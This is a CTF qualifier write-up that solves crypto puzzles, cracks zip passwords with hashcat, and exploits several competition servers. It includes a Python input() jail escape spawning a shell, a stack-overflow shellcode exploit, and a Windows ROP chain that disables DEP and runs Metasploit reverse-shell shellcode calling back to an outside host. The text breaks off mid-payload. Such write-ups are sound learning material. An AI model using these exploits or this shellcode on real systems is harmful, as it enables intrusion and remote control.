---
title: "2019 Timisoara CTF Quals Writeup"
date: 2019-9-19
tags: [Timisoara]
categories: [CTF]
---

> Team : Complex
>
> Rank : 7
>
> Country : Republic of Korea
>
> Points : 4,426

# Crypto

## Baby Crypto (50pts)

> This file seems... odd

In the name of the problem, I thought it was a Caesar cipher.

So I use Caesar decoder site. ( https://cryptii.com/ )

Shift by 8 to get the flag.

```
Otil bw amm gwc uilm qb! Emtkwum bw bpm ewvlmznct ewztl wn kzgxbwozixpg! Pmzm qa gwcz zmeizl: BQUKBN{Rctqca_Kimaiz_e0ctl_j3_xzwcl}

=> Glad to see you made it! Welcome to the wonderful world of cryptography! Here is your reward: TIMCTF{Julius_Caesar_w0uld_b3_proud}
```

**FLAG : `TIMCTF{Julius_Caesar_w0uld_b3_proud}`**

<br />

## Proof of work (100pts)

> While developing an anti-bot system we thought of a system to test if the users are indeed human. You need to enter a string whose SHA256 has the last 7 digits 0. As this hash is secure you need to use some processing power, thus denying spam. Sort of like mining bitcoin.
>
> nc 89.38.208.143 21021

just bruteforce attack and find sha256 end of 0000000

```python
import hashlib
import re

import string
ALLOWED_CHARACTERS = string.printable
NUMBER_OF_CHARACTERS = len(ALLOWED_CHARACTERS)

def characterToIndex(char):
    return ALLOWED_CHARACTERS.index(char)

def indexToCharacter(index):
    if NUMBER_OF_CHARACTERS <= index:
        raise ValueError("Index out of range.")
    else:
        return ALLOWED_CHARACTERS[index]

def next(string):
    if len(string) <= 0:
        string.append(indexToCharacter(0))
    else:
        string[0] = indexToCharacter((characterToIndex(string[0]) + 1) % NUMBER_OF_CHARACTERS)
        if characterToIndex(string[0]) is 0:
            return list(string[0]) + next(string[1:])
    return string

def main():
    sequence = list()
    while True:
        sequence = next(sequence)
        tmp = ''.join(i for i in sequence)
        m = hashlib.sha256()
    	m.update(tmp)
    	md5string=m.hexdigest()
        print md5string
        if md5string[57:] == '0000000':
            print md5string + " : " + tmp
            exit(0)

if __name__ == "__main__":
    main()
```

![](https://user-images.githubusercontent.com/32904385/65012438-4df5a280-d952-11e9-9b84-748d24076070.png)

after connecting to the nc server, enter `S@"m4` to get the flag.

![](https://user-images.githubusercontent.com/32904385/65012446-53eb8380-d952-11e9-8698-040de83dcbcb.png)

**FLAG : `IMCTF{9e13449f334ded947431aa5001c2e9ab429ab5ddf880f416fe352a96eb2af122}`**

<br />

## Alien Alphabet (150pts)

> I found this strange text. It is written in some strange alphabet. Can you decode it?

![](https://user-images.githubusercontent.com/32904385/65012655-1dfacf00-d953-11e9-94ea-20aef6c0a1e8.png)

i found this cipher is [TEMPHIS](https://www.dafont.com/temphis.font) .

I translated the last line and found a flag.

**FLAG : `TIMCTF{TEMPHIS_IS_AWESOME}`**

<br />

## Password breaker (150pts)

> I heard you were good at cracking passwords!
>
> **Hint!** What are the most common attacks on a password? Dictionary and bruteforce
>
> **Hint!** If it takes more than a few minutes you're doing it wrong.

So I thought I had to solve the problem with a dictionary attack and brute force.

I used https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt ( rockyou.txt ) for dictionary attack.

And I used `zip2john` and `hashcat`.

First, I find zip file's hash.

```bash
juntae@ubuntu:~/JohnTheRipper/run$ ./zip2john flag.zip 
flag.zip/stage2.zip:$zip2$*0*3*0*9ac9ce6ee278a40d4cf411eaa648131b*fd6b*b2*78cef498d2a837ebd25d26208209f19952c77ab4c21f0d68c2fca0f766bf59341fc96a1d7939008fe56bf8668337f7916baa22389b0fc27e2cb0047c3ff05e2dde94c33fde57190fe478b52636464bf8ee32fc36860270f1b8a921236b2b46ac16f813e77992ce3344906f9da2647a1fd15cce19f70cc9b1346e300adde56b0e31508793d9dea93140262dae208c88f536a93511f4bafd3b5ccc90543f7e0c2820902e7c4499c9330ab00dcf3e0b4b8535fa*c57c8b72e78f366e2d87*$/zip2$:stage2.zip:flag.zip:flag.zip
```

And make `hash.txt`

```
$zip2$*0*3*0*9ac9ce6ee278a40d4cf411eaa648131b*fd6b*b2*78cef498d2a837ebd25d26208209f19952c77ab4c21f0d68c2fca0f766bf59341fc96a1d7939008fe56bf8668337f7916baa22389b0fc27e2cb0047c3ff05e2dde94c33fde57190fe478b52636464bf8ee32fc36860270f1b8a921236b2b46ac16f813e77992ce3344906f9da2647a1fd15cce19f70cc9b1346e300adde56b0e31508793d9dea93140262dae208c88f536a93511f4bafd3b5ccc90543f7e0c2820902e7c4499c9330ab00dcf3e0b4b8535fa*c57c8b72e78f366e2d87*$/zip2$
```

Finally, use `hashcat`. 

I can get zip file's password.

```bash
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\aaa\Desktop\hashcat-5.1.0\hashcat-5.1.0>hashcat64.exe -m 13600 flag_hash.txt rockyou.txt
hashcat (v5.1.0) starting...

* Device #1: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
OpenCL Platform #1: NVIDIA Corporation
======================================
* Device #1: GeForce GTX 960, 512/2048 MB allocatable, 8MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Watchdog: Temperature abort trigger set to 90c

Dictionary cache built:
* Filename..: rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 1 sec

$zip2$*0*3*0*9ac9ce6ee278a40d4cf411eaa648131b*fd6b*0*78cef498d2a837ebd25d26208209f19952c77ab4c21f0d68c2fca0f766bf59341fc96a1d7939008fe56bf8668337f7916baa22389b0fc27e2cb0047c3ff05e2dde94c33fde57190fe478b52636464bf8ee32fc36860270f1b8a921236b2b46ac16f813e77992ce3344906f9da2647a1fd15cce19f70cc9b1346e300adde56b0e31508793d9dea93140262dae208c88f536a93511f4bafd3b5ccc90543f7e0c2820902e7c4499c9330ab00dcf3e0b4b8535fa*c57c8b72e78f366e2d87*$/zip2$:johncena1234

Session..........: hashcat
Status...........: Cracked
Hash.Type........: WinZip
Hash.Target......: $zip2$*0*3*0*9ac9ce6ee278a40d4cf411eaa648131b*fd6b*.../zip2$
Time.Started.....: Wed Sep 18 23:17:18 2019 (4 secs)
Time.Estimated...: Wed Sep 18 23:17:22 2019 (0 secs)
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   266.9 kH/s (5.84ms) @ Accel:64 Loops:62 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 917504/14344384 (6.40%)
Rejected.........: 0/917504 (0.00%)
Restore.Point....: 884736/14344384 (6.17%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:992-999
Candidates.#1....: lennylove -> jam16
Hardware.Mon.#1..: Temp: 54c Fan: 30% Util: 76% Core:1468MHz Mem:3004MHz Bus:16

Started: Wed Sep 18 23:17:15 2019
Stopped: Wed Sep 18 23:17:24 2019

C:\Users\aaa\Desktop\hashcat-5.1.0\hashcat-5.1.0>
```

first password is `johncena1234`.

The password for stage2 can also be found in the same way.

Here, brute force is used.

```bash
juntae@ubuntu:~/JohnTheRipper/run$ ./zip2john stage2.zip 
stage2.zip/flag.txt:$zip2$*0*3*0*91f5b5c56b6f9aa71f0197c3f93e42c1*a1f8*21*1e7161f9e69797bd2fd8807cf7322289965fc39ea99ad05bab85343f58b802183a*d2163b2e7e4d1d7d89c2*$/zip2$:flag.txt:stage2.zip:stage2.zip
```

Finally, Brute force it!

```bash
C:\Users\aaa\Desktop\hashcat-5.1.0\hashcat-5.1.0>hashcat64.exe -m 13600 -a 3 stage2_hash.txt a?a?a?a?
hashcat (v5.1.0) starting...

* Device #1: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
OpenCL Platform #1: NVIDIA Corporation
======================================
* Device #1: GeForce GTX 960, 512/2048 MB allocatable, 8MCU

INFO: All hashes found in potfile! Use --show to display them.

Started: Wed Sep 18 23:46:31 2019
Stopped: Wed Sep 18 23:46:31 2019

C:\Users\aaa\Desktop\hashcat-5.1.0\hashcat-5.1.0>hashcat64.exe -m 13600 -a 3 stage2_hash.txt a?a?a?a? --show
$zip2$*0*3*0*91f5b5c56b6f9aa71f0197c3f93e42c1*a1f8*21*1e7161f9e69797bd2fd8807cf7322289965fc39ea99ad05bab85343f58b802183a*d2163b2e7e4d1d7d89c2*$/zip2$:bo$$

C:\Users\aaa\Desktop\hashcat-5.1.0\hashcat-5.1.0>
```

Last password is `bo$$`.

**FLAG : `TIMCTF{12345_is_A_bad_passw0rd}`**

<br />

## TimCTF gamblig service (200pts)

> Predict the next number to win. Are you that lucky?
>
> nc 89.38.208.143 21023

- First I thought Mersenne Twister
- But It wasn't
- I just guess _`Unixtime`_ and that's right

```python
from pwn import *
from ctypes import *
c = CDLL("/lib/x86_64-linux-gnu/libc.so.6")

p = remote("89.38.208.143",21023)
c.srand(c.time(0)) 
for i in range(10):
	p.recvuntil("choice: ")
	p.sendline("1")
	x = int(p.recvline())
	print i+1," : Predict=",c.rand()," : Recved=",
	print x
p.recvuntil("choice: ")
p.sendline("2")
p.recvuntil("guess: ")
p.sendline(str(c.rand()))
p.interactive()
```

- I failed few times, but finally Succeed.

```bash
circler@Circler:/mnt/c/Users/Circler/Documents/ctf/timisoara/crypto$ python ctype.py
[+] Opening connection to 89.38.208.143 on port 21023: Done
1  : Predict= 1085972033  : Recved= 1085972033
2  : Predict= 1086492775  : Recved= 1086492775
3  : Predict= 199921567  : Recved= 199921567
4  : Predict= 1854423452  : Recved= 1854423452
5  : Predict= 637623845  : Recved= 637623845
6  : Predict= 1180811229  : Recved= 1180811229
7  : Predict= 1322382820  : Recved= 1322382820
8  : Predict= 297329854  : Recved= 297329854
9  : Predict= 1637532318  : Recved= 1637532318
10  : Predict= 1132466532  : Recved= 1132466532
[*] Switching to interactive mode
Congratulations! Here is your reward: TIMCTF{Now_You_c4N_ch3at_aT_pacanele}
[*] Got EOF while reading in interactive
```

**FLAG : `TIMCTF{Now_You_c4N_ch3at_aT_pacanele}`**

<br />

## Strange cipher (250pts)

> I have found this strange encryption service. Can you decode it?
>
> nc 89.38.208.143 21022

```python
from pwn import *
import string
p = remote('89.38.208.143',21022)
p.recvuntil('flag: ')
enc = p.recvline()
enc = enc.split(' ')
del enc[-1]
print enc
table = string.printable
payload = ''
attempt = 254
for i in range(8):
    for j in table:
        p.sendlineafter('remaining: ',payload + j)
        p.recvuntil('Encrypted string: ')
        go = p.recvline().split()
        if enc[i] == go[i]:
            payload += j
            print "[*] payload = " + payload
            break
        print 'try -> ' + str(attempt) + " : " + j
        attempt -= 1
p.interactive()
```

brute force attack and make table

![](https://user-images.githubusercontent.com/32904385/65013538-741d4180-d956-11e9-8201-56cb69d69ccf.png)

**FLAG : `TIMCTF{Y0u_really_make_A_diff3rence}`**

<br />

# Exploit

## Hiss hiss python (50pts)

> This snake likes to h1ss at its input.
>
> nc 89.38.208.144 11113
>
> **Hint!** What is wrong with python input function?

```python
import sys
print ("Hello user! I will give you a test. If you pass it, you get the flag\n")
print ("What is 2 + 3? ")
sys.stdout.flush()
x = input()

if (x == 5):
    print("Eh, I was just kidding. No flag for you")
else:
    print("Try again!")
```

Python `input` function has vulnerability.

If I use this vulnerability, I can execute any command. 

This is easy `python-jail-break` problem, no filtering.

So, I can find `python-jail-cheatsheet` in google, and I use it.

### Exploit

```python
from pwn import *

#context.log_level = "debug"
r = remote("89.38.208.144", 11113)
command = "__import__('subpro'+'cess').call(['/bin/sh', '-s'])"
r.sendlineafter("? \n",command)
r.interactive()
```

**FLAG : `TIMCTF{h1ss_h1ss_shell}`**

<br />

## Swag (100pts) ![](https://user-images.githubusercontent.com/32904385/65112572-156dcb80-da1b-11e9-8133-e348ea7ecc6b.png)

> The server only lets hackers in, not script kiddies.
>
> nc 89.38.208.144 11111

First, I see `swag.cpp`

```C
#include <stdio.h>
#include <time.h>
#include <stdlib.h>

using namespace std;

int global_cookie;
int main()
{
	char name[64];
	int cookie;
	int a;
	srand(time(0));
	cookie = rand();
	global_cookie = cookie;
	a = 2;
	printf("Enter your name: ");
	fflush(stdout);
	gets(name);
	printf("Hello, %s", name);

	if((cookie != global_cookie) || (a != 1))
	{
		printf(", it appears you don't have enough swag\n");
		exit(0);
	}
	printf(", I really like your swag. Come in!\n");
	return 0;
}
```

and, I open `swag` binary with `IDA pro`.

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  char v5; // [rsp+0h] [rbp-50h]
  int v6; // [rsp+48h] [rbp-8h]
  int v7; // [rsp+4Ch] [rbp-4h]

  v3 = time(0LL);
  srand(v3);
  v7 = rand();
  global_cookie = v7;
  v6 = 2;
  printf("Enter your name: ", argv);
  fflush(_bss_start);
  gets(&v5);
  printf("Hello, %s", &v5);
  if ( v7 != global_cookie || v6 != 1 )
  {
    puts(", it appears you don't have enough swag");
    exit(0);
  }
  puts(", I really like your swag. Come in!");
  puts("Your access code is: TIMCTF{1_am_th3_c00kie_m0nsta}");
  return 0;
}
```

**FLAG : `TIMCTF{1_am_th3_c00kie_m0nsta}`**

<br />

## Bof-server (100pts)

> Today kids we learn how to write exploits for super-secure software: bof-server!
>
> nc 89.38.208.144 11112
>
> (non-standard flag format)

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [rsp+0h] [rbp-100h]

  printf("Hello! Here is the stack address: %llx, enter your name please: ", &v4, envp);
  fflush(_bss_start);
  gets(&v4);
  printf("Nice to meet you, %s!\n", &v4);
  return 0;
}
```

This binary use `gets()`, we can catch `RIP`.

And, problem gives me `stack address`.

Finally, `NX bit` is disabled.

```bash
juntae@ubuntu:~/ctf/timisoara/pwn/bof-server$ checksec bof-server
[*] '/home/juntae/ctf/timisoara/pwn/bof-server/bof-server'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

This is mitigation of problem.

### Exploit

As explained earlier, I can use shellcode.

So, I build shellcode in stack and make `RIP` stack address.

```python
from pwn import *

context.arch = "amd64"
#context.log_level = "debug"

#r = remote("89.38.208.144",11112)
r = process("./bof-server")
e = ELF("./bof-server")
libc = e.libc

r.recvuntil(": ")
stack = int(r.recv(12),16)
log.info("stack : " + hex(stack))

shellcode = shellcraft.sh()

payload = asm(shellcode) 
payload = payload.ljust(0x108,"\x00")
payload += p64(stack)
r.sendlineafter("please: ",payload)

r.interactive()
```

**FLAG : `TIMCTF{oooverfl0w}wwwWWW`**

<br />

## Rop Me Baby (200pts)

> Can you still pull out a buffer overflow attack if the stack is non-executable? Let's find out:
>
> nc 89.38.208.147 2025
>
> Note: as socat is not working in windows for some reason there is only one instance of this running at a time. Please make sure you disconnect properly. We will add more ports asap.

```asm
.text:000000000040159A ; __unwind { // sub_4ADA90
.text:000000000040159A                 push    rbp
.text:000000000040159B                 push    rbx
.text:000000000040159C                 mov     eax, 13D8h
.text:00000000004015A1                 call    sub_40C5F0
.text:00000000004015A6                 sub     rsp, rax
.text:00000000004015A9                 lea     rbp, [rsp+80h]
.text:00000000004015B1                 call    sub_40B220
.text:00000000004015B6                 lea     rax, [rbp+1360h+WSAData]
.text:00000000004015BD                 mov     rdx, rax        ; lpWSAData
.text:00000000004015C0                 mov     ecx, 202h       ; wVersionRequested
.text:00000000004015C5                 mov     rax, cs:WSAStartup
.text:00000000004015CC                 call    rax ; WSAStartup
.text:00000000004015CE                 mov     r8d, 6          ; protocol
.text:00000000004015D4                 mov     edx, 1          ; type
.text:00000000004015D9                 mov     ecx, 2          ; af
.text:00000000004015DE                 mov     rax, cs:socket
.text:00000000004015E5                 call    rax ; socket
.text:00000000004015E7                 mov     [rbp+1360h+s], rax
.text:00000000004015EE                 mov     [rbp+1360h+name.sa_family], 2
.text:00000000004015F7                 mov     dword ptr [rbp+1360h+name.sa_data+2], 0
.text:0000000000401601                 mov     ecx, 2025       ; hostshort
.text:0000000000401606                 mov     rax, cs:htons
.text:000000000040160D                 call    rax ; htons
.text:000000000040160F                 mov     word ptr [rbp+1360h+name.sa_data], ax
.text:0000000000401616                 lea     rax, [rbp+1360h+name]
.text:000000000040161D                 mov     rcx, [rbp+1360h+s] ; s
.text:0000000000401624                 mov     r8d, 10h        ; namelen
.text:000000000040162A                 mov     rdx, rax        ; name
.text:000000000040162D                 mov     rax, cs:bind
.text:0000000000401634                 call    rax ; bind
.text:0000000000401636                 cmp     eax, 0FFFFFFFFh
.text:0000000000401639                 setz    al
.text:000000000040163C                 test    al, al
.text:000000000040163E                 jz      short loc_401666
.text:0000000000401640                 lea     rdx, aUnableToBindSo ; "Unable to bind socket!\r\n"
.text:0000000000401647                 mov     rcx, cs:off_4B6FB0
.text:000000000040164E                 call    sub_4A9FC0
.text:0000000000401653                 mov     rax, cs:WSACleanup
.text:000000000040165A                 call    rax ; WSACleanup
.text:000000000040165C                 mov     ebx, 0
.text:0000000000401661                 jmp     loc_401955
```

First, open socket and port 2025.

So, I think `rop_me_baby.exe` is server

```asm
.text:0000000000401666 loc_401666:                             ; CODE XREF: sub_40159A+A4↑j
.text:0000000000401666                 mov     rax, [rbp+1360h+s]
.text:000000000040166D                 mov     edx, 14h        ; backlog
.text:0000000000401672                 mov     rcx, rax        ; s
.text:0000000000401675                 mov     rax, cs:listen
.text:000000000040167C                 call    rax ; listen
.text:000000000040167E                 lea     rdx, aWaitingForClie ; "Waiting for clients: "
.text:0000000000401685                 mov     rcx, cs:off_4B6FB0
.text:000000000040168C                 call    sub_4A9FC0
```

Second, start listen and waiting client.

```c
.text:0000000000401807                 mov     rdx, rax        ; buf
.text:000000000040180A                 mov     rax, [rbp+1360h+var_18]
.text:0000000000401811                 mov     r9d, 0          ; flags
.text:0000000000401817                 mov     r8d, ebx        ; len
.text:000000000040181A                 mov     rcx, rax        ; s
.text:000000000040181D                 mov     rax, cs:send
.text:0000000000401824                 call    rax ; send
.text:0000000000401826                 lea     rax, [rbp+1360h+var_60]
.text:000000000040182D                 mov     rcx, rax
.text:0000000000401830                 call    sub_48FBF0
.text:0000000000401835                 lea     rax, [rbp+1360h+var_80]
.text:000000000040183C                 mov     rcx, rax
.text:000000000040183F                 call    sub_48FBF0
.text:0000000000401844                 mov     rax, [rbp+1360h+var_18]
.text:000000000040184B                 mov     r9d, 0          ; flags
.text:0000000000401851                 mov     r8d, 1000h      ; len
.text:0000000000401857                 lea     rdx, buf        ; buf
.text:000000000040185E                 mov     rcx, rax        ; s
.text:0000000000401861                 mov     rax, cs:recv
.text:0000000000401868                 call    rax ; recv
.text:000000000040186A                 mov     [rbp+1360h+var_34], eax
.text:0000000000401870                 mov     eax, [rbp+1360h+var_34]
.text:0000000000401876                 mov     edx, eax
.text:0000000000401878                 lea     rcx, buf
.text:000000000040187F                 call    sub_401550
.text:0000000000401884                 lea     rdx, aReceived  ; "Received: "
.text:000000000040188B                 mov     rcx, cs:off_4B6FB0
.text:0000000000401892                 call    sub_4A9FC0
```

Third, server wait payload.

The place to enter payload is `BSS section`. 

This part causes the vulnerability. Because the length limit is not appropriate.

So, I can catch `RIP` .

### Exploit

I used reverse connection Because it is communication between server and client.

This .exe has `DEP` protection.

So we have to bypass `DEP` with `windows ROP`.

The payload scenario is shown below.

```
0. Prepare a server for reverse connection.
1. Set register. ( RCX,RDX,R8,R9 )
2. Call VirtualProtect. ( This function can turn off DEP. )
	- VirtualProtect in kernel32.dll
	- problem give kernel32.dll's base address
	- We can use kernel32's function!
3. build NOP sled + window reverse shellcode.
4. Change the RIP to the position where the nop sled is located.
5. The shell is connected to the my server.
```

Gadgets were extracted from the rop_me_baby.exe binary using rp++.

My gadget is here.

```asm
pop_rbx = 0x00401D52 # pop rbx ; ret ;

pop_rcx = 0x0040c620 # pop rcx ; ret ;
pop_rdx = 0x00401095 # pop rdx ; xor eax, eax ; add rsp, 0x28 ; ret ;
pop_r8  = 0x004960b3 # pop r8 ; add rsp, 0x28 ; pop rbx ; pop rsi ; ret;
pop_r9  = 0x004a4a14 # pop r9 ; mov byte [rbx+0x000000E1], 0x00000001 ; mov byte [rbx+0x000000E0], sil ; add rsp, 0x20 ; pop rbx ; pop rsi ; pop rdi ; ret ;
log.info("pop_rcx : " + hex(pop_rcx))
log.info("pop_rdx : " + hex(pop_rdx))
log.info("pop_r8  : " + hex(pop_r8))
log.info("pop_r9  : " + hex(pop_r9))
```

The shellcode came from the metasploit with the windows x64 tcp reverse conection.

My shellcode is here.

```c
shellcode = ""
shellcode += "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50" 
shellcode += "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52" 
shellcode += "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a" 
shellcode += "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41" 
shellcode += "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52" 
shellcode += "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48" 
shellcode += "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40" 
shellcode += "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48" 
shellcode += "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41" 
shellcode += "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1" 
shellcode += "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c" 
shellcode += "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01" 
shellcode += "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a" 
shellcode += "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b" 
shellcode += "\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33" 
shellcode += "\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00" 
shellcode += "\x00\x49\x89\xe5\x49\xbc\x02\x00\x2d\x5b\xd3\xef\x7c\xed"
shellcode += "\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
shellcode += "\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
shellcode += "\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
shellcode += "\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea" 
shellcode += "\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89" 
shellcode += "\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81" 
shellcode += "\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00" 
shellcode += "\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0" 
shellcode += "\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01" 
shellcode += "\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41" 
shellcode += "\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d" 
shellcode += "\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48" 
shellcode += "\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff" 
shellcode += "\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5" 
shellcode += "\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb" 
shellcode += "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5"
# windows x64 reverse shell TCP
```

Finally, my full exploit code is here.

```python
from pwn import *

#context.log_level = "debug"

r = remote("89.38.208.147",2025) #remote
#r = remote("192.168.2.234",2025) #local
r.recvuntil("Ntdll address is: ")
ntdll = int(r.recv(12),16)

r.recvuntil("kernel32 address is: ")
kernel32 = int(r.recv(12),16)

log.info("ntdll : " + hex(ntdll))
log.info("kernel32 : " + hex(kernel32))

protect = kernel32 + 0x14d0 #remote
#protect = kernel32 + 0x1acb0 #local

bss = 0x0000000004DE040
log.info("bss : " + hex(bss))

shellcode = ""
shellcode += "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50" 
shellcode += "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52" 
shellcode += "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a" 
shellcode += "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41" 
shellcode += "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52" 
shellcode += "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48" 
shellcode += "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40" 
shellcode += "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48" 
shellcode += "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41" 
shellcode += "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1" 
shellcode += "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c" 
shellcode += "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01" 
shellcode += "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a" 
shellcode += "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b" 
shellcode += "\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33" 
shellcode += "\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00" 
shellcode += "\x00\x49\x89\xe5\x49\xbc\x02\x00\x2d\x5b\xd3\xef\x7c\xed"
shellcode += "\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
shellcode += "\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
shellcode += "\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
shellcode += "\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea" 
shellcode += "\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89" 
shellcode += "\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81" 
shellcode += "\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00" 
shellcode += "\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0" 
shellcode += "\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01" 
shellcode += "\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41" 
shellcode += "\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d" 
shellcode += "\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48" 
shellcode += "\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff" 
shellcode += "\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5" 
shellcode += "\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb" 
shellcode += "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5"
# windows x64 reverse shell TCP

##### parameter #####
# rcx	:	bss
# rdx	:	0x6000
# r8	:	0x40
# r9	:	bss + 0x1000

pop_rbx = 0x00401D52 # pop rbx ; ret ;

pop_rcx = 0x0040c620 # pop rcx ; ret ;
pop_rdx = 0x00401095 # pop rdx ; xor eax, eax ; add rsp, 0x28 ; ret ;
pop_r8  = 0x004960b3 # pop r8 ; add rsp, 0x28 ; pop rbx ; pop rsi ; ret;
pop_r9  = 0x004a4a14 # pop r9 ; mov byte [rbx+0x000000E1], 0x00000001 ; mov byte [rbx+0x000000E0], sil ; add rsp, 0x20 ; pop rbx ; pop rsi ; pop rdi ; ret ;
log.info("pop_rcx : " + hex(pop_rcx))
log.info("pop_rdx : " + hex(pop_rdx))
log.info("pop_r8  : " + hex(pop_r8))
log.info("pop_r9  : " + hex(pop_r9))

payload = "" 
payload += "A" * (256 + 8)

payload += p64(pop_rbx)
payload += p64(bss)

payload += p64(pop_r9)
payload += p64(bss + 0x1000) + p64(0) * 3
payload += "A" * 0x20

payload += p64(pop_r8)
